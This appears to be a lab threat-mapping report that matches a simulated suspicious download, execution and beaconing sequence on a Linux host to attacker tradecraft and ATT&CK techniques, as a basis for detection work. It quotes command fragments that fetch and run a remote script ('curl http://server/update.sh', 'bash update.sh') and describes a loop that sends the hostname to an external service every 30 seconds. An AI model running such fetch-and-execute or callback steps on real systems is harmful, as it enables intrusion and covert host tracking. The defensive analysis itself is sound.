# Suspicious File Download Activity - Threat Mapping

## Objective

Compare investigated behavior against known attacker tradecraft and determine whether the observed activity aligns with established attack patterns.

This phase uses evidence collected during investigation to:

* identify adversary-like behavior
* compare observed actions to known attack workflows
* determine likely attacker objectives
* map behavior to ATT&CK techniques supported by evidence

Only techniques directly supported by telemetry and investigation findings are mapped.

---

# Investigated Behavior Summary

The investigation established the following behavioral sequence:

```text
Remote file acquisition
        ↓
File written to disk
        ↓
Permission modification
        ↓
Script execution
        ↓
Host identification
        ↓
Outbound communication
        ↓
Periodic outbound communication
```

This behavior was observed consistently across both delivery variants.

The only difference between variants was the payload acquisition method.

---

# Comparison Against Known Adversary Tradecraft

## Pattern 1 - Tool and Payload Delivery

Observed behavior:

```text
curl http://server/update.sh

or

ftp server
```

followed by:

```text
update.sh
```

appearing on disk.

### Similar Attacker Behavior

Attackers commonly deliver payloads from remote infrastructure after initial access.

Typical examples include:

* downloading shell scripts
* downloading malware loaders
* downloading post-exploitation tools
* retrieving staging payloads
* retrieving persistence mechanisms

The observed behavior closely matches this operational pattern.

### Assessment

The activity strongly resembles deliberate payload delivery rather than normal administrative activity.

---

## Pattern 2 - Immediate Execution After Acquisition

Observed behavior:

```text
Acquire file
      ↓
chmod +x
      ↓
bash update.sh
```

### Similar Attacker Behavior

Attackers frequently execute payloads shortly after retrieval.

Common workflow:

```text
Download
      ↓
Prepare
      ↓
Execute
```

The short time interval between acquisition and execution increases confidence that the retrieved file was intentionally deployed.

### Assessment

The behavior resembles post-delivery payload activation.

---

## Pattern 3 - Host Identification

Observed behavior:

```text
hostname
```

executed by the payload.

### Similar Attacker Behavior

Malware and post-exploitation scripts commonly collect basic host information.

Typical objectives:

* host identification
* victim tracking
* campaign management
* system inventory

The hostname is often used as a unique identifier during communication with attacker-controlled infrastructure.

### Assessment

Observed behavior is consistent with host profiling activity.

---

## Pattern 4 - External Communication

Observed behavior:

```text
curl
```

transmitting:

```text
host=bunny-VirtualBox
```

to an external service.

### Similar Attacker Behavior

Malware frequently communicates collected host information back to an operator-controlled system.

Typical purposes include:

* victim registration
* callback confirmation
* infection tracking
* command retrieval
* status reporting

### Assessment

The communication appears purposeful and structured.

---

## Pattern 5 - Recurring Communications

Observed behavior:

```text
hostname
     ↓
curl
     ↓
sleep 30
     ↓
repeat
```

### Similar Attacker Behavior

Many malware families establish periodic communications after successful execution.

Common objectives:

* maintain operator visibility
* provide host status updates
* receive future instructions
* confirm continued execution

The recurring interval observed during the simulation is characteristic of automated communication behavior.

### Assessment

Observed activity resembles beaconing behavior.

---

# ATT&CK Mapping

## T1105 - Ingress Tool Transfer

### Evidence

Variant 1:

```text
curl -> update.sh
```

Variant 2:

```text
ftp -> update.sh
```

### Justification

A remote resource is transferred from an external service onto the host for later execution.

### Confidence

High

---

## T1059.004 - Unix Shell

### Evidence

```text
bash update.sh
```

### Justification

The payload is executed through a Unix shell interpreter.

### Confidence

High

---

## T1082 - System Information Discovery

### Evidence

```text
hostname
```

### Justification

The payload collects basic host identification information.

### Confidence

Medium

The simulation only demonstrates limited host discovery activity.

---

## T1071.001 - Application Layer Protocol: Web Protocols

### Evidence

```text
curl
```

using HTTP communications.

### Justification

The payload communicates using standard web protocols.

### Confidence

High

---

# Attack Flow Mapping

The observed activity can be represented as:

```text
T1105
Ingress Tool Transfer
        ↓
T1059.004
Unix Shell Execution
        ↓
T1082
System Information Discovery
        ↓
T1071.001
Web Protocol Communications
```

This sequence is fully supported by collected telemetry.

---

# Potential Adversary Objective

No evidence suggests:

* privilege escalation
* persistence
* credential theft
* lateral movement
* defense evasion

The observed behavior instead indicates a workflow focused on:

```text
Payload delivery
        ↓
Payload execution
        ↓
Host identification
        ↓
Operator communication
```

The most likely objective demonstrated by the simulation is establishment of an operational foothold capable of communicating with external infrastructure.

---

# Threat Mapping Conclusions

Evidence collected during investigation supports the conclusion that the observed activity closely resembles a staged payload deployment workflow.

The following attacker behaviors were identified:

1. Remote payload delivery.
2. Payload activation through shell execution.
3. Basic host discovery.
4. Structured outbound communications.
5. Recurring callback behavior.

The strongest ATT&CK-supported attack chain is:

```text
T1105
Ingress Tool Transfer
        ↓
T1059.004
Unix Shell
        ↓
T1082
System Information Discovery
        ↓
T1071.001
Application Layer Protocol
```

The observed workflow represents a realistic adversary pattern involving payload delivery, execution, host identification, and recurring communications with external infrastructure.

These findings provide the basis for detection logic engineering.
